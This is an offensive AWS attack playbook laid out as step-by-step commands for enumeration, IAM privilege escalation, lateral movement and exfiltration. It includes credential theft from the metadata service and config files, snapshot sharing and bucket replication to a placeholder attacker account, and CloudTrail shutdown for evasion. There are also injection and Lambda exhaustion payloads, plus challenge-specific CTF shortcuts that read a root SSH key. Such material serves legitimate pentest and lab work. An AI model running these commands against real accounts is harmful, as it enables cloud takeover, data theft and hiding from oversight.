# AWS — Recon, IAM Privilege Escalation, S3 / Lambda

## When this applies

- You have AWS credentials (access key) or are testing a cloud-hosted target.
- Goal: enumerate resources, identify IAM misconfigurations, escalate privileges, exfiltrate from S3 / Lambda.

## Technique

Run `aws sts get-caller-identity` first. Then enumerate per service (S3, IAM, EC2, Lambda) with `aws-cli`. Use Pacu for guided privesc enumeration.

## Steps

### AWS CLI enumeration

```bash
# Configure AWS CLI
aws configure

# Identity information
aws sts get-caller-identity

# List S3 buckets
aws s3 ls

# Check bucket permissions
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name

# List EC2 instances
aws ec2 describe-instances

# List IAM users
aws iam list-users

# Get user policies
aws iam list-user-policies --user-name username
aws iam list-attached-user-policies --user-name username

# List security groups
aws ec2 describe-security-groups

# List Lambda functions
aws lambda list-functions

# List RDS instances
aws rds describe-db-instances

# Enumerate exposed snapshots
aws ec2 describe-snapshots --owner-ids self

# Check for public snapshots
aws ec2 describe-snapshots --filters "Name=volume-size,Values=*" --query 'Snapshots[?Public==`true`]'
```

### Prowler

```bash
# Install Prowler
git clone https://github.com/prowler-cloud/prowler
cd prowler

# Run full assessment
./prowler -M text html json

# Check specific services
./prowler -s s3
./prowler -s iam

# Check specific region
./prowler -r us-east-1

# Output formats
./prowler -M html  # HTML report
./prowler -M json  # JSON output
```

### ScoutSuite

```bash
# Install ScoutSuite
pip install scoutSuite

# Run AWS audit
scout aws --profile default

# Run with specific services
scout aws --services s3,iam,ec2

# View report
python -m http.server 8000
# Open report.html
```

### S3 bucket testing

```bash
# S3Scanner
python3 s3scanner.py bucketname

# Test public access
aws s3 ls s3://bucket-name --no-sign-request

# Download from public bucket
aws s3 cp s3://bucket-name/file.txt . --no-sign-request

# Check for directory listing
curl http://bucket-name.s3.amazonaws.com/

# Test write access
aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request
```

### IAM privilege escalation paths

```bash
# List IAM permissions
aws iam list-attached-user-policies --user-name user
aws iam get-policy-version --policy-arn arn --version-id v1

# Common privilege escalation paths:
# 1. CreateAccessKey on another user
aws iam create-access-key --user-name admin

# 2. AttachUserPolicy
aws iam attach-user-policy --user-name self --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. PutUserPolicy
aws iam put-user-policy --user-name self --policy-name escalate --policy-document file://admin-policy.json

# 4. CreatePolicyVersion
aws iam create-policy-version --policy-arn arn --policy-document file://admin.json --set-as-default

# 5. Lambda function with privileged role
aws lambda update-function-code --function-name func --zip-file fileb://payload.zip

# 6. iam:PassRole + a service that runs code — pass an existing admin role to code you control
aws lambda create-function --function-name x --runtime python3.12 --handler x.h \
  --role <ADMIN_ROLE_ARN> --zip-file fileb://f.zip      # needs iam:PassRole + lambda:CreateFunction, then invoke
aws ec2 run-instances --image-id <AMI> --iam-instance-profile Arn=<ADMIN_PROFILE>  # then read its creds via IMDS
```

### Pacu (AWS exploitation framework)

```bash
# Install Pacu
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
pip3 install -r requirements.txt

# Run Pacu
python3 pacu.py

# Import AWS keys
import_keys --profile default

# Enumerate permissions
run iam__enum_permissions

# Enumerate users and roles
run iam__enum_users_roles_policies_groups

# Detect vulnerable Lambda functions
run lambda__enum

# Privilege escalation
run iam__privesc_scan
```

### Lateral movement — assume roles, run commands

Cloud pivoting is identity-to-identity: read a credential, reuse it, repeat.

```bash
# Read the instance role straight from the metadata service (on-box code, or an SSRF that reaches it)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/          # role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>    # key, secret, token
# IMDSv2 first needs a session token (PUT); a hop limit of 1 blocks most SSRF
TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')

# Step into another role, including cross-account; chain role -> role as the trust policies allow
aws sts assume-role --role-arn <ROLE_ARN> --role-session-name s

# Systems Manager Run Command: execute on managed instances with no SSH (needs ssm:SendCommand)
aws ssm send-command --document-name AWS-RunShellScript \
  --targets Key=instanceIds,Values=<INSTANCE_ID> --parameters commands='id'
aws ssm list-command-invocations --command-id <ID> --details                    # read the output

# Reuse credentials that are already lying around
printenv | grep -i AWS_
aws ssm get-parameters-by-path --path / --recursive --with-decryption
aws secretsmanager get-secret-value --secret-id <NAME>
cat ~/.aws/credentials
```

### Exfiltration — often a share, not a download

The quietest channels create no data-plane egress on the victim side.

```bash
# Share a snapshot to an attacker account, then restore your own copy there
aws ec2 modify-snapshot-attribute --snapshot-id <SNAP> --attribute createVolumePermission \
  --operation-type add --user-ids <ATTACKER_ACCOUNT_ID>
aws rds modify-db-snapshot-attribute --db-snapshot-identifier <SNAP> \
  --attribute-name restore --values-to-add <ATTACKER_ACCOUNT_ID>

# Presigned URL turns a private object into a link anyone can fetch
aws s3 presign s3://<BUCKET>/<KEY> --expires-in 3600

# Let the platform move it: cross-account bucket replication to an attacker-owned bucket
aws s3api put-bucket-replication --bucket <BUCKET> --replication-configuration file://repl.json
```

Detection tell: the control-plane event (`ModifySnapshotAttribute`, a new replication rule), not the byte count.

### Defense evasion — logging blind spots

- `aws cloudtrail stop-logging` / `delete-trail` / a selective `update-trail` halt or narrow recording; the call is itself logged, so it is a high-value alert.
- A region or account with no trail or no GuardDuty is unmonitored, and trails do not record S3 object-level reads unless data events are enabled.

### LocalStack-backed cloud challenges

CTF and lab cloud targets often expose **LocalStack** (a local AWS emulator) on a sibling vhost like `s3.<host>` rather than the real AWS endpoint. Fingerprint:
- `Server: hypercorn-h11` and `access-control-allow-headers` listing `x-localstack-target` and `x-amz-*` values.
- `GET /` returns `{"status": "running"}`; `GET /health` lists which AWS services are simulated.

Authenticate with **`AWS_ACCESS_KEY_ID=test` / `AWS_SECRET_ACCESS_KEY=test`** (default credentials accept any value).

```python
import socket
TARGET = "<TARGET_IP>"
HOSTS = {"s3.bucket.example": TARGET, "bucket.example": TARGET}
_o = socket.getaddrinfo
socket.getaddrinfo = lambda h, *a, **k: _o(HOSTS.get(h, h), *a, **k)

import boto3
from botocore.client import Config
s3 = boto3.client("s3", endpoint_url="http://s3.bucket.example",
    aws_access_key_id="test", aws_secret_access_key="test",
    region_name="us-east-1",
    config=Config(s3={"addressing_style": "path"}))
print([b["Name"] for b in s3.list_buckets()["Buckets"]])
```

**Fast-path enumeration in priority order:**
1. `s3.list_buckets()` then `list_objects_v2` per bucket
2. `s3.list_object_versions(Bucket=...)` (deleted/older files often contain creds)
3. `s3.get_bucket_policy/cors/notification`
4. `dynamodb.list_tables()` then `scan` each — these tables are the classic location for plaintext passwords
5. `secretsmanager.list_secrets()`, `ssm.describe_parameters()`
6. `lambda.list_functions()` + `lambda.get_function(...)` (download `Code.Location` for embedded creds)

**Common exploitation primitives:**
- **PutObject into web-served bucket** → upload PHP shell or `.htaccess` if the bucket contents are synced into a writable webroot
- **DynamoDB `put_item` injection** → if a table is read by an internal PDF/email/notification pipeline, attacker rows can trigger SSRF, XSS
- **Versioned buckets** retain pre-cleanup content
- **Lambda functions** with `--zip-file` updates can be hijacked when the boto3 client has IAM `lambda:UpdateFunctionCode`

### LocalStack-backed cloud target patterns

- **Default test/test creds always work** — never spray; just use these
- **Sync direction is webroot → S3, not S3 → webroot** — cron typically runs `aws s3 sync /var/www/html/ s3://adserver/`, so files PUT to S3 by the attacker do NOT appear in the webroot
- **DynamoDB credential reuse is the real foothold** — DDB `users` table contains role-tagged users; one of those passwords is *always* the SSH password for an OS-level Linux user. Try every `(linux_user, ddb_password)` combo before any RCE chain.
- **pd4ml file-read primitive** — once inside, look for `/var/www/<appname>/` containing `pd4ml_demo.jar` and an `index.php` with `passthru("java ... Pd4Cmd file:///.../files/$name 800 A4 -out files/result.pdf")`. Insert into the configured DDB table a row whose data field is `<html><pd4ml:attachment src="file:///root/.ssh/id_rsa" .../></html>`, POST `action=get_alerts` to localhost:8000, then `pdfdetach -saveall` the resulting `result.pdf`. Cleanup loops delete attacker rows within ~60 s — chain everything in one SSH command.

### AWS Lambda testing

```bash
# List functions
aws lambda list-functions

# Get function details
aws lambda get-function --function-name function-name

# Get function configuration
aws lambda get-function-configuration --function-name function-name

# Invoke function
aws lambda invoke --function-name function-name --payload '{"key":"value"}' output.txt

# Get function policy
aws lambda get-policy --function-name function-name

# Check environment variables (may contain secrets)
aws lambda get-function-configuration --function-name name | jq .Environment

# Download function code
aws lambda get-function --function-name name --query 'Code.Location' --output text
```

### Lambda injection / SSRF testing

```bash
# Injection testing
aws lambda invoke --function-name function-name \
  --payload '{"command": "cat /etc/passwd"}' output.txt

# SSRF testing
aws lambda invoke --function-name function-name \
  --payload '{"url": "http://169.254.169.254/latest/meta-data/"}' output.txt

# Resource exhaustion
for i in {1..1000}; do
  aws lambda invoke --function-name function-name output-$i.txt &
done
```

## Verifying success

- `sts get-caller-identity` returns assumed-role / privesc target identity.
- `s3 ls s3://bucket --no-sign-request` succeeds — public bucket confirmed.
- Pacu `iam__privesc_scan` reports a viable path.

## Common pitfalls

- IMDSv2 requires PUT + custom header — most SSRF can't reach metadata.
- Some buckets are public for ListBucket but private for GetObject — both must succeed.
- Lambda payloads must match the function's expected event schema.

## Tools

- aws-cli, boto3
- Pacu, ScoutSuite, Prowler, CloudMapper, cloudsplaining, S3Scanner
- LocalStack default creds (test/test)
